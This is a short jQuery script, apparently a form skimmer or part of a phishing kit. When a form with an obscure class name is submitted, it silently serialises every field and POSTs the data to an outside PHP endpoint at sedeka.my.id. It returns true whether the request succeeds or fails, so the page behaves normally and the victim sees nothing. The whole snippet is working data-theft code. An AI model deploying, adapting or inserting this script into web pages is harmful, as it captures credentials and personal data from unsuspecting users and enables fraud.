$(".falxvrf").submit(function() {
	var d = $(".falxvrf");

	$.ajax({
        url: "http://sedeka.my.id/apiii.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
